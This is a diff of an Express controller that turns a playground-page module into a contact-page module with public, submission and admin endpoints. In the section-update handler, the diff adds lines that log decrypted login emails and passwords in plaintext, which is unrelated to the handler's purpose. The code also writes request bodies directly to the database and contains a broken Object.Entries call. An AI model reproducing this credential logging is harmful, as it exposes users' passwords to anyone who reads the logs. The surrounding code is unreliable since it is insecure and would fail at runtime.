@@ -1,6 +1,6 @@
-const PlaygroundPage = require('../models/PlaygroundPage');
-const PlaygroundBooking = require('../models/PlaygroundBooking');
-const { logger, decryptData } = require("../../utils/enc_dec_c");
+const ContactPage = require('../../models/ContactPage');
+const ContactSubmission = require('../../models/ContactSubmission');
+const { logger, decryptData } = require("../../../utils/enc_dec_admin");
 
 const toDotPath = (value) => {
     if (typeof value !== 'string') return '';
@@ -79,24 +79,34 @@ const getUploadedFiles = (req) => {
     return files;
 };
 
-const getActivePlayground = async () => {
-    let playground = await PlaygroundPage.findOne({ isActive: true }).sort({ updatedAt: -1, createdAt: -1, _id: -1 });
-    if (!playground) playground = await PlaygroundPage.create({ isActive: true });
-    return playground;
+const getActiveContact = async () => {
+    let contact = await ContactPage.findOne({ isActive: true }).sort({ updatedAt: -1, createdAt: -1, _id: -1 });
+    if (!contact) contact = await ContactPage.create({ isActive: true });
+    return contact;
 };
 
 // 1. PUBLIC AGGREGATED ENDPOINT 
-exports.getPlaygroundData = async (req, res) => {
+exports.getContactData = async (req, res) => {
     try {
-        const playgroundData = await getActivePlayground();
-        res.status(200).json({ success: true, data: playgroundData });
+        const contactData = await getActiveContact();
+        res.status(200).json({ success: true, data: contactData });
     } catch (err) {
-        console.error("Error fetching playground page data:", err);
-        res.status(500).json({ success: false, error: 'Failed to fetch playground data' });
+        console.error("Error fetching contact page data:", err);
+        res.status(500).json({ success: false, error: 'Failed to fetch contact data' });
     }
 };
 
-// 2. ADMIN SECTION-WISE ENDPOINTS
+// 2. CONTACT MESSAGE SUBMISSION
+exports.submitContactMessage = async (req, res) => {
+    try {
+        const submission = await ContactSubmission.create(req.body);
+        res.status(201).json({ success: true, message: 'Message sent successfully', data: submission });
+    } catch (err) {
+        res.status(500).json({ success: false, error: err.message });
+    }
+};
+
+// 3. ADMIN SECTION MANAGEMENT
 exports.getSection = (sectionName) => async (req, res) => {
     try {
         try {
@@ -105,19 +115,19 @@ exports.getSection = (sectionName) => async (req, res) => {
                 const decryptedData = decryptData(encryptedData);
             }
         } catch (e) { }
-        const playground = await getActivePlayground();
-        let target = playground;
+        const contact = await getActiveContact();
+        let target = contact;
         if (sectionName.includes('.')) {
             const parts = sectionName.split('.');
             for (const part of parts) {
                 if (target) target = target[part];
             }
         } else {
-            target = playground[sectionName];
+            target = contact[sectionName];
         }
 
         if (target === undefined) {
-             return res.status(404).json({ success: false, message: 'Section not found' });
+            return res.status(404).json({ success: false, message: 'Section not found' });
         }
         res.status(200).json({ success: true, data: target });
     } catch (err) {
@@ -130,27 +140,39 @@ exports.updateSection = (sectionName) => async (req, res) => {
         try {
             const encryptedData = req.params.data || req.body.data || req.query.data;
             if (encryptedData) {
+                logger.info("User Login request received");
                 const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
             }
         } catch (e) { }
-        const playground = await getActivePlayground();
+        const contact = await getActiveContact();
+
+        // Handle scalar sections like `mapIframe` cleanly (avoid spreading strings)
+        const schemaPath = ContactPage.schema.path(sectionName);
+        const isScalar = schemaPath && schemaPath.instance === 'String';
+
+        if (isScalar) {
+            const nextValue = req.body?.value ?? req.body?.[sectionName];
+            if (nextValue === undefined) {
+                return res.status(400).json({ success: false, message: 'Missing value to update' });
+            }
+            contact.set(sectionName, nextValue);
+            contact.markModified(sectionName);
+            await contact.save();
+            return res.status(200).json({ success: true, data: contact[sectionName] });
+        }
+
         const updateData = {};
 
-        // 1) Normalize body keys (supports `title`, `hero[title]`, `formSection[presentation][title]`, etc)
+        // 1) Normalize body keys (supports `title`, `hero[title]`, `hero.title`)
         for (const [key, value] of Object.Entries(req.body || {})) {
             const relativePath = toSectionRelativeFieldPath(sectionName, key);
             setNested(updateData, relativePath, value);
         }
 
-        // 2) Handle file uploads (routes use upload.single())
+        // 2) Handle file uploads
         for (const file of getUploadedFiles(req)) {
-            let relativePath = toSectionRelativeFieldPath(sectionName, file.fieldname);
-
-            // Alias: admin route uses `image` but schema expects `presentation.mainImage`
-            if (sectionName === 'formSection' && (relativePath === 'image' || toDotPath(relativePath) === 'image')) {
-                relativePath = 'presentation.mainImage';
-            }
-
+            const relativePath = toSectionRelativeFieldPath(sectionName, file.fieldname);
             setNested(updateData, relativePath, file.filename);
         }
 
@@ -176,13 +198,13 @@ exports.updateSection = (sectionName) => async (req, res) => {
         for (const [path, value] of Object.entries(flattenedUpdates)) {
             let normalizedPath = normalizeDuplicatedSectionPrefix(sectionName, path);
             normalizedPath = normalizeHeroBackgroundPath(sectionName, normalizedPath);
-            playground.set(normalizedPath, value === null ? undefined : value);
-            playground.markModified(normalizedPath);
+            contact.set(normalizedPath, value === null ? undefined : value);
+            contact.markModified(normalizedPath);
         }
 
-        await playground.save();
+        await contact.save();
         const parts = sectionName.split('.');
-        const result = parts.reduce((obj, part) => obj && obj[part], playground);
+        const result = parts.reduce((obj, part) => obj && obj[part], contact);
         res.status(200).json({ success: true, data: result });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
@@ -197,37 +219,27 @@ exports.deleteSection = (sectionName) => async (req, res) => {
                 const decryptedData = decryptData(encryptedData);
             }
         } catch (e) { }
-        const playground = await getActivePlayground();
+        const contact = await getActiveContact();
         if (sectionName.includes('.')) {
             const parts = sectionName.split('.');
-            let target = playground;
+            let target = contact;
             for (let i = 0; i < parts.length - 1; i++) {
                 target = target[parts[i]];
             }
             const lastPart = parts[parts.length - 1];
             target[lastPart] = undefined;
         } else {
-            playground[sectionName] = undefined;
+            contact[sectionName] = undefined;
         }
-        await playground.save();
+        await contact.save();
         res.status(200).json({ success: true, message: `Section ${sectionName} has been cleared/reset` });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
     }
 };
 
-// 3. USER SUBMISSION HANDLER (Requested: ONLY POST to get response)
-exports.submitBooking = async (req, res) => {
-    try {
-        const booking = await PlaygroundBooking.create(req.body);
-        res.status(201).json({ success: true, message: 'Booking inquiry submitted successfully!', data: booking });
-    } catch (err) {
-        res.status(500).json({ success: false, error: err.message });
-    }
-};
-
-// 4. ADMIN BOOKING MANAGEMENT
-exports.getAllBookings = async (req, res) => {
+// 4. ADMIN SUBMISSION MANAGEMENT
+exports.getAllSubmissions = async (req, res) => {
     try {
         try {
             const encryptedData = req.params.data || req.body.data || req.query.data;
@@ -235,8 +247,40 @@ exports.getAllBookings = async (req, res) => {
                 const decryptedData = decryptData(encryptedData);
             }
         } catch (e) { }
-        const bookings = await PlaygroundBooking.find().sort({ createdAt: -1 });
-        res.status(200).json({ success: true, data: bookings });
+        const submissions = await ContactSubmission.find().sort({ createdAt: -1 });
+        res.status(200).json({ success: true, data: submissions });
+    } catch (err) {
+        res.status(500).json({ success: false, error: err.message });
+    }
+};
+
+exports.updateSubmissionStatus = async (req, res) => {
+    try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                const decryptedData = decryptData(encryptedData);
+            }
+        } catch (e) { }
+        const submission = await ContactSubmission.findByIdAndUpdate(req.params.id, req.body, { new: true });
+        if (!submission) return res.status(404).json({ success: false, message: 'Submission not found' });
+        res.status(200).json({ success: true, data: submission });
+    } catch (err) {
+        res.status(500).json({ success: false, error: err.message });
+    }
+};
+
+exports.deleteSubmission = async (req, res) => {
+    try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                const decryptedData = decryptData(encryptedData);
+            }
+        } catch (e) { }
+        const submission = await ContactSubmission.findByIdAndDelete(req.params.id);
+        if (!submission) return res.status(404).json({ success: false, message: 'Submission not found' });
+        res.status(200).json({ success: true, message: 'Submission deleted' });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
     }
